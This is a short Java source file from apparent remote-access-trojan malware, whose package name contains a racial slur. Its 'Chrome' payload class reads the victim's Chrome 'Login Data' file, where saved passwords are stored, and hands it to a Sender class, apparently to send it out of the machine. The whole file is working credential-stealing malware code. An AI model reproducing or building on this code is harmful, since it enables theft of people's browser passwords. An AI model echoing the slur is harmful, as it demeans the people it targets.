package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final class Chrome implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Optional<File> file = FileUtil.getFile(System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data");
        file.ifPresent(Sender::send);
    }
}
